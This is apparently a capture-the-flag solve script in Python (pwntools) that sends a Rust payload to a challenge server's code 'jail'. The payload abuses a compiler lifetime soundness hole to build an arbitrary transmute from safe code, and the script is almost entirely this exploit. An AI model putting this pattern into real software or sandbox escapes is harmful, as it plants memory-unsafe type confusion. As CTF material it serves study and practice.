from pwn import *

HOST = "blazinglyfast.opus4-7.b01le.rs"
PORT = 8443

# Put only the BODY of:
# pub fn jail(input: In) -> Out { ... }
payload = r"""
enum E<A, B> {
    A(Option<Box<A>>),
    B(Option<Box<B>>),
}

static UNIT: &'static &'static () = &&();

fn widen_mut<'a, 'b, T>(_: &'a &'b (), x: &'b mut T, _: &()) -> &'a mut T {
    x
}

fn expand_mut<'a, 'b, T>(x: &'a mut T) -> &'b mut T {
    let f: fn(_, &'a mut T, &()) -> &'b mut T = widen_mut;
    f(UNIT, x, &())
}

fn transmute<A, B>(obj: A) -> B {
    fn inner<A, B>(e: &mut E<A, B>, obj: A) -> B {
        let E::B(slot) = e else { loop {} };
        let slot = expand_mut(slot);
        *e = E::A(Some(Box::new(obj)));
        core::hint::black_box(e);
        *slot.take().unwrap()
    }

    inner(core::hint::black_box(&mut E::B(None)), obj)
}

transmute(input)
""".strip()

io = remote(HOST, PORT, ssl=True)
print(io.recvuntil(b"Finish with EOF").decode(errors="replace"))

io.send(payload.encode() + b"\nEOF\n")

resp = io.recvall(timeout=5)
print(resp.decode(errors="replace"))